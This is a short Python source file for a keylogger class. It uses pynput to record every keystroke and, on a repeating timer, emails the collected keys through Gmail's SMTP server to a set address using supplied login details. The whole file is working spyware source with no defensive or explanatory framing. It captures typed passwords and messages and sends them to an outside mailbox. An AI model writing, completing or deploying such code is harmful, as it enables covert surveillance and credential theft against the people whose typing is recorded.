import pynput.keyboard
import threading
import smtplib

class sniff:
    def __init__(self,time_interval,from_address,to_address,password):
        self.f=from_address
        self.password=password
        self.to=to_address
        self.interval= time_interval
        self.log =""
        print("start")
    def append_log(self,string):
        self.log =  self.log + string

    def callback(self,key):
        global log
        try:
            custom=str(key.char)
        except AttributeError:
            if key==key.space:
                custom=" "
            else:
                custom=""+str(key)+""
        self.append_log(custom)

                
    def sendmail(self,keystrokes):
        mailsent = smtplib.SMTP("smtp.gmail.com", 587)
        mailsent.starttls()
        mailsent.login(self.f,self.password)
        mailsent.sendmail(self.f,self.to, keystrokes)
        mailsent.quit()

    def reportgenerate(self):
        global log
        self.sendmail(self.log)
        self.log=""
        timer =threading.Timer(self.interval,self.reportgenerate)
        timer.start()
    def start(self):
        listener=pynput.keyboard.Listener(on_press=self.callback)
        with listener:
            self.reportgenerate()
            listener.join()
